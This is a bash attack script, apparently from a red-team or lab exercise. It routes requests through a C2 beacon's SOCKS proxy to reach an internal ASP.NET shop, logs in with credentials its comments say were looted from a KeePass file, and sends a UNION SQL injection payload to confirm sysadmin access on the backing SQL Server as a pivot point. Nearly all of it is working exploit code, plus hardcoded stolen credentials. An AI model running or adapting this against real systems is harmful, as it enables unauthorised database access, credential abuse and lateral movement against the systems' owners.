#!/bin/bash
# =============================================================================
# M5.2 — SQL injection on OSCAR-WEB CorpShop  [VALIDATED LIVE via Mythic SOCKS]
#
# Search.aspx builds a query by string concatenation:
#     SELECT Name, Category, Price FROM dbo.Products WHERE Name LIKE '%<txtQ>%'
# The page requires a login first (Default.aspx checks dbo.Users). The web-app
# creds come from the M4.4 KeePass loot (appsvc:AppSvc_P@ss1, also webadmin).
# The DB connection runs as `appsvc`, which is a SYSADMIN login on OSCAR-DB, so
# the injection has full server context (this is the pivot into M5.3/M5.5).
#
# Reached through C2: Kali -> Athena beacon SOCKS (/tmp/pc.conf) -> OSCAR-WEB.
# Note: the ~16s/req SOCKS latency makes sqlmap impractical; a manual UNION is
# used to confirm injection + context in a single request.
# =============================================================================
set -u
PC="proxychains4 -f /tmp/pc.conf"
B="http://10.3.40.20:8080"
J=/tmp/cj.txt; rm -f "$J"
xf(){ grep -oE "id=\"$1\" value=\"[^\"]*\"" "$2" | sed -E "s/.*value=\"([^\"]*)\"/\1/" | head -1; }

echo "== 1. login (appsvc) -- echo the server's own valid ViewState back =="
$PC curl -s -m 45 -c "$J" -o /tmp/d.html "$B/Default.aspx" 2>/dev/null
VS=$(xf __VIEWSTATE /tmp/d.html); EV=$(xf __EVENTVALIDATION /tmp/d.html); VG=$(xf __VIEWSTATEGENERATOR /tmp/d.html)
$PC curl -s -m 45 -b "$J" -c "$J" -L -o /tmp/l.html \
  --data-urlencode "__VIEWSTATE=$VS" --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
  --data-urlencode "__EVENTVALIDATION=$EV" \
  --data-urlencode "txtUser=appsvc" --data-urlencode "txtPass=AppSvc_P@ss1" \
  --data-urlencode "btnLogin=Log in" "$B/Default.aspx" 2>/dev/null
grep -oiE "Product Search|Invalid credentials" /tmp/l.html | head -1   # expect "Product Search"

echo "== 2. UNION injection (version | current login | sysadmin?) =="
$PC curl -s -m 45 -b "$J" -c "$J" -o /tmp/s.html "$B/Search.aspx" 2>/dev/null
VS=$(xf __VIEWSTATE /tmp/s.html); EV=$(xf __EVENTVALIDATION /tmp/s.html); VG=$(xf __VIEWSTATEGENERATOR /tmp/s.html)
Q="%' UNION SELECT CAST(@@version AS NVARCHAR(200)), SYSTEM_USER, CAST(IS_SRVROLEMEMBER('sysadmin') AS DECIMAL(10,2)) -- "
$PC curl -s -m 60 -b "$J" -c "$J" -o /tmp/r.html \
  --data-urlencode "__VIEWSTATE=$VS" --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
  --data-urlencode "__EVENTVALIDATION=$EV" \
  --data-urlencode "txtQ=$Q" --data-urlencode "btnSearch=Search" "$B/Search.aspx" 2>/dev/null
grep -oiE "Microsoft SQL Server[^<]*|<td>appsvc</td>|<td>1.00</td>" /tmp/r.html | head -3
# PASS: injected row returns "Microsoft SQL Server 2019 ...", login "appsvc",
#       IS_SRVROLEMEMBER('sysadmin')=1  -> injection confirmed WITH sysadmin context.
echo "M5.2 PASS: UNION SQLi on Search.aspx as appsvc (sysadmin) on OSCAR-DB."
